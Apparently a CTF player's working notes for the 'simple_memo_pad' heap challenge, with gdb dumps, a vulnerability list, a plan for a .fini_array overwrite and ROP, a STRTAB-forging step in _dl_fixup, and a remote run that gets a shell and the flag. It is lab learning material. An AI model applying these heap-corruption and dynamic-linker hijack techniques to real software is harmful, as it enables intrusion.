gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled


*******************************
*       Simple Memo Pad       *
*******************************
                     Ver. Alpha


1. Write a note on a blank area
2. Edit a note
3. Delete a note
4. Show a note
5. Quit
> 

initialization
--------------
	- in initialization routine, mallocs random size...
	- THIS ESSENTIALLY RANDOMIZES THE HEAP ADDRESSES

initNotes
---------
- 20 notes initialized
- note 1 is sample note
- randomly generated cookie placed in first qword

  struct note{
	cookie
	idx
	status
	data
	FD
	BK	
	} 

gdb-peda$ x/100xg 0x60e540
0x60e540:       0x0000000000000000      0x00000000000000b1
0x60e550:       0x7846f60f448bdf00      0x0000000100000001
0x60e560:       0x2073692073696854      0x656c706d61732061
0x60e570:       0x0000000000000021      0x0000000000000000
0x60e580:       0x0000000000000000      0x0000000000000000
0x60e590:       0x0000000000000000      0x0000000000000000
0x60e5a0:       0x0000000000000000      0x0000000000000000
0x60e5b0:       0x0000000000000000      0x0000000000000000
0x60e5c0:       0x0000000000000000      0x0000000000000000
0x60e5d0:       0x0000000000000000      0x0000000000000000
0x60e5e0:       0x000000000060e600      0x0000000000000000 
0x60e5f0:       0x0000000000000000      0x00000000000000b1 
0x60e600:       0x7846f60f448bdf00      0x0000000000000002 <-- cookie ;  status, idx 
0x60e610:       0x0000000000000000      0x0000000000000000 <-- data
0x60e620:       0x0000000000000000      0x0000000000000000
0x60e630:       0x0000000000000000      0x0000000000000000
0x60e640:       0x0000000000000000      0x0000000000000000
0x60e650:       0x0000000000000000      0x0000000000000000
0x60e660:       0x0000000000000000      0x0000000000000000
0x60e670:       0x0000000000000000      0x0000000000000000
0x60e680:       0x0000000000000000      0x0000000000000000
0x60e690:       0x000000000060e6b0      0x000000000060e550 <-- FD ; BK
0x60e6a0:       0x0000000000000000      0x00000000000000b1
0x60e6b0:       0x7846f60f448bdf00      0x0000000000000003
0x60e6c0:       0x0000000000000000      0x0000000000000000
0x60e6d0:       0x0000000000000000      0x0000000000000000
0x60e6e0:       0x0000000000000000      0x0000000000000000
0x60e6f0:       0x0000000000000000      0x0000000000000000
0x60e700:       0x0000000000000000      0x0000000000000000
0x60e710:       0x0000000000000000      0x0000000000000000
0x60e720:       0x0000000000000000      0x0000000000000000
0x60e730:       0x0000000000000000      0x0000000000000000
0x60e740:       0x000000000060e760      0x000000000060e600
0x60e750:       0x0000000000000000      0x00000000000000b1
0x60e760:       0x7846f60f448bdf00      0x0000000000000004
0x60e770:       0x0000000000000000      0x0000000000000000
0x60e780:       0x0000000000000000      0x0000000000000000
0x60e790:       0x0000000000000000      0x0000000000000000
0x60e7a0:       0x0000000000000000      0x0000000000000000
0x60e7b0:       0x0000000000000000      0x0000000000000000
0x60e7c0:       0x0000000000000000      0x0000000000000000
0x60e7d0:       0x0000000000000000      0x0000000000000000
0x60e7e0:       0x0000000000000000      0x0000000000000000
0x60e7f0:       0x000000000060e810      0x000000000060e6b0
0x60e800:       0x0000000000000000      0x00000000000000b1
0x60e810:       0x7846f60f448bdf00      0x0000000000000005
0x60e820:       0x0000000000000000      0x0000000000000000
0x60e830:       0x0000000000000000      0x0000000000000000
0x60e840:       0x0000000000000000      0x0000000000000000
0x60e850:       0x0000000000000000      0x0000000000000000


[!] cookie is the same for each heapchunk! try to leak?

vulns
-----
- we can edit a note and overwrite its FD ptr
- we can also free a note
	- set corrupted FD ptr + 0x98 to equal (FD->bk = bk) 
	- set BK ptr + 0x90 to equal corrupted FD ptr
- we can overwrite .dtors entry
- .fini_array @ 0x6017C0 
	- it is writeable!

- can write note on blank note as many times as we want!




plan
----
1. overwrite .fini_array w/ heap chunk whose contents we control
2. rop to call 
	fd = open("flag.txt", 0, 0)
    read(fd, dest, 0xff) 
    write(1, dest, 0xff)


corrupt FD to make it point towards 



0x6017f8


gdb-peda$ find 0x6c53a86094d22000 all
Searching for '0x6c53a86094d22000' in: all ranges
Found 24 results, display max 24 items:
 [heap] : 0x1f231c0 --> 0x6c53a86094d22000 
 [heap] : 0x1f23270 --> 0x6c53a86094d22000 
 [heap] : 0x1f23320 --> 0x6c53a86094d22000 
 [heap] : 0x1f233d0 --> 0x6c53a86094d22000 
 [heap] : 0x1f23480 --> 0x6c53a86094d22000 
 [heap] : 0x1f23530 --> 0x6c53a86094d22000 
 [heap] : 0x1f235e0 --> 0x6c53a86094d22000 
 [heap] : 0x1f23690 --> 0x6c53a86094d22000 
 [heap] : 0x1f23740 --> 0x6c53a86094d22000 
 [heap] : 0x1f237f0 --> 0x6c53a86094d22000 
 [heap] : 0x1f238a0 --> 0x6c53a86094d22000 
 [heap] : 0x1f23950 --> 0x6c53a86094d22000 
 [heap] : 0x1f23a00 --> 0x6c53a86094d22000 
 [heap] : 0x1f23ab0 --> 0x6c53a86094d22000 
 [heap] : 0x1f23b60 --> 0x6c53a86094d22000 
 [heap] : 0x1f23c10 --> 0x6c53a86094d22000 
 [heap] : 0x1f23cc0 --> 0x6c53a86094d22000 
 [heap] : 0x1f23d70 --> 0x6c53a86094d22000 
 [heap] : 0x1f23e20 --> 0x6c53a86094d22000 
 [heap] : 0x1f23ed0 --> 0x6c53a86094d22000 
 mapped : 0x7f8b6ef65728 --> 0x6c53a86094d22000 
[stack] : 0x7ffd2447da38 --> 0x6c53a86094d22000 
[stack] : 0x7ffd2447da68 --> 0x6c53a86094d22000 
[stack] : 0x7ffd2447dab8 --> 0x6c53a86094d22000 



"""
let _dl_fixup() return (*got_libc_start + delta) by using fake linkmap

https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/dl-runtime.c;h=92596acf996725eda2939b838091317fea54e507;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf

  59 DL_FIXUP_VALUE_TYPE
  60 attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
  61 _dl_fixup (
  62 # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
  63            ELF_MACHINE_RUNTIME_FIXUP_ARGS,
  64 # endif
  65            struct link_map *l, ElfW(Word) reloc_arg)
  66 {
 ...
 133       value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
 ...
 148   return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
 149 }

https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/generic/dl-lookupcfg.h;h=3ac1f468698c24828c83367cc18cdc5db9546216;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf

  23 #define DL_FIXUP_MAKE_VALUE(map, addr) (addr)
"""





gdb-peda$ x/100xg 0x7ffff7ffe168
0x7ffff7ffe168: 0x0000000000000000      0x00007ffff7ffe6f8
0x7ffff7ffe178: 0x00000000006017d0      0x00007ffff7ffe700
0x7ffff7ffe188: 0x0000000000000000      0x00007ffff7ffe168
0x7ffff7ffe198: 0x0000000000000000      0x00007ffff7ffe6e0
0x7ffff7ffe1a8: 0x0000000000000000      0x00000000006017d0
0x7ffff7ffe1b8: 0x00000000006018b0      0x00000000006018a0
0x7ffff7ffe1c8: 0x0000000000000000      0x0000000000601850 <0x601850 +0x68
0x7ffff7ffe1d8: 0x0000000000601860      0x00000000006018e0 <0x601860 +0x70
0x7ffff7ffe1e8: 0x00000000006018f0      0x0000000000601900
0x7ffff7ffe1f8: 0x0000000000601870      0x0000000000601880
0x7ffff7ffe208: 0x00000000006017e0      0x00000000006017f0
0x7ffff7ffe218: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe228: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe238: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe248: 0x00000000006018c0      0x0000000000601890
0x7ffff7ffe258: 0x0000000000000000      0x00000000006018d0 <0x6018d0 +0xf8
0x7ffff7ffe268: 0x0000000000000000      0x0000000000601800
0x7ffff7ffe278: 0x0000000000601820      0x0000000000601810
0x7ffff7ffe288: 0x0000000000601830      0x0000000000000000
0x7ffff7ffe298: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe2a8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe2b8: 0x0000000000601920      0x0000000000601910
0x7ffff7ffe2c8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe2d8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe2e8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe2f8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe308: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe318: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe328: 0x0000000000000000      0x0000000000601930 <0x601930 +0x1c8
0x7ffff7ffe338: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe348: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe358: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe368: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe378: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe388: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe398: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe3a8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe3b8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe3c8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe3d8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe3e8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe3f8: 0x0000000000000000      0x0000000000601840
0x7ffff7ffe408: 0x0000000000400040      0x00000000004007d0
0x7ffff7ffe418: 0x0000000000000008      0x00007ffff7ff79c8
0x7ffff7ffe428: 0x0000000000000003      0x00007ffff7ffe6d8
0x7ffff7ffe438: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe448: 0x00007ffff7ff79e0      0x0000000100000004 <0x00007ffff7ff79e0 +0x2e0
0x7ffff7ffe458: 0x0000000000000000      0x0000000000400270
0x7ffff7ffe468: 0x0000000000400278      0x0000000000400278
0x7ffff7ffe478: 0x0000001c00000001      0xffffffffffffffff
0x7ffff7ffe488: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe498: 0x00000000004004c0      0x0000000000000000
0x7ffff7ffe4a8: 0x0000000000400000      0x0000000000601a50
0x7ffff7ffe4b8: 0x00000000004017b4      0x00007ffff7ffe420
0x7ffff7ffe4c8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe4d8: 0x0000000000000000      0x0000000000000004
0x7ffff7ffe4e8: 0x00007ffff7ffe4c0      0x00007ffff7ffe420 <--0x00007ffff7ffe420 +0x380
0x7ffff7ffe4f8: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe508: 0x0000000000000000      0xffffffffffffffff
0x7ffff7ffe518: 0x0000000000000000      0x00007ffff7ff79a8
0x7ffff7ffe528: 0x0000000000000000      0x0000000100000000
0x7ffff7ffe538: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe548: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe558: 0x0000000000000000      0x0000000000400388
0x7ffff7ffe568: 0x0000000000000004      0x0000000000000000
0x7ffff7ffe578: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe588: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe598: 0x0000000000000000      0x0000000000000000
0x7ffff7ffe5a8: 0x0000000000000000      0x0000000000000000


b *_dl_fixup+188

rdi: 0x7ffff7ffe168
   0x7ffff7de69fe <_dl_fixup+14>:       mov    rax,QWORD PTR [rdi+0x68]
=> 0x7ffff7de6a02 <_dl_fixup+18>:       mov    rdi,QWORD PTR [rax+0x8]

will set rax = 0x0000000000601850 , rdi = 0x400418
0x400418 is the real STRTAB

gdb-peda$ x/xg 0x0000000000601850+0x8
0x601858:       0x0000000000400418 <-- REAL STRTAB. LET'S OVERWRITE THIS WITH A HEAP CHUNK ADDR!

"atoi" @ 0x400465
gdb-peda$ x/32xg 0x0000000000400418
0x400418:       0x6f732e6362696c00      0x6174735f5f00362e <--STRTA
0x400428:       0x665f6b68635f6b63      0x6978655f006c6961
0x400438:       0x6e656c7274730074      0x007465736d656d00
0x400448:       0x5f6f6e7272655f5f      0x6e6f697461636f6c
0x400458:       0x616d006461657200      0x6f746100636f6c6c
0x400468:       0x0065736f6c630069      0x656c73006e65706f
0x400478:       0x6d63727473007065      0x6362696c5f5f0070
0x400488:       0x6d5f74726174735f      0x74697277006e6961
0x400498:       0x6e6f6d675f5f0065      0x5f5f74726174735f
0x4004a8:       0x325f4342494c4700      0x4342494c4700342e
0x4004b8:       0x0000352e322e325f      0x0002000200020000
0x4004c8:       0x0002000200030002      0x0000000200020002

gdb-peda$ x/21s 0x400418
0x400418:       ""
0x400419:       "libc.so.6"
0x400423:       "__stack_chk_fail"
0x400434:       "_exit"
0x40043a:       "strlen"
0x400441:       "memset"
0x400448:       "__errno_location"
0x400459:       "read"
0x40045e:       "malloc"
0x400465:       "atoi"
0x40046a:       "close"
0x400470:       "open"
0x400475:       "sleep"
0x40047b:       "strcmp"
0x400482:       "__libc_start_main"
0x400494:       "write"
0x40049a:       "__gmon_start__"
0x4004a9:       "GLIBC_2.4"
0x4004b3:       "GLIBC_2.2.5"
0x4004bf:       ""
0x4004c0:       ""


gdb-peda$ shell readelf -S simple_memo_pad 
There are 29 section headers, starting at offset 0x1b78:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400200  00000200
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             000000000040021c  0000021c
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.build-i NOTE             000000000040023c  0000023c
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400260  00000260
       000000000000001c  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           0000000000400280  00000280 <--.dynsym holds dynamic linking symbol table
       0000000000000198  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           0000000000400418  00000418 <--.dynstr ( holds strings needed for dynamic linking.
       00000000000000a7  0000000000000000   A       0     0     1                 most commonly the strings that represent
  [ 7] .gnu.version      VERSYM           00000000004004c0  000004c0              the names associated w/symbol table entries )
       0000000000000022  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          00000000004004e8  000004e8
       0000000000000030  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400518  00000518
       0000000000000018  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             0000000000400530  00000530
       0000000000000168  0000000000000018  AI       5    24     8
  [11] .init             PROGBITS         0000000000400698  00000698
       000000000000001a  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         00000000004006c0  000006c0
       0000000000000100  0000000000000010  AX       0     0     16
  [13] .plt.got          PROGBITS         00000000004007c0  000007c0
       0000000000000008  0000000000000000  AX       0     0     8
  [14] .text             PROGBITS         00000000004007d0  000007d0
       0000000000000a32  0000000000000000  AX       0     0     16
  [15] .fini             PROGBITS         0000000000401204  00001204
       0000000000000009  0000000000000000  AX       0     0     4
  [16] .rodata           PROGBITS         0000000000401210  00001210

STRTAB = string table


➜  simple_memo_pad python solve.py memopad.tasks.ctf.codeblue.jp 5498
[*] For remote: solve.py HOST PORT
[+] Opening connection to memopad.tasks.ctf.codeblue.jp on port 5498: Done
[*] Switching to interactive mode
 $ id
uid=5498109 gid=5498(p5498) groups=5498(p5498)
$ cat flag
CBCTF{A11_y0ur_5tRtaB_are_beL0nG_tO_uS}

[*] Got EOF while reading in interactive



	  result = _dl_lookup_symbol_x (strtab + refsym->st_name, l,
					&defsym, l->l_scope, version,
					ELF_RTYPE_CLASS_PLT, flags, NULL);
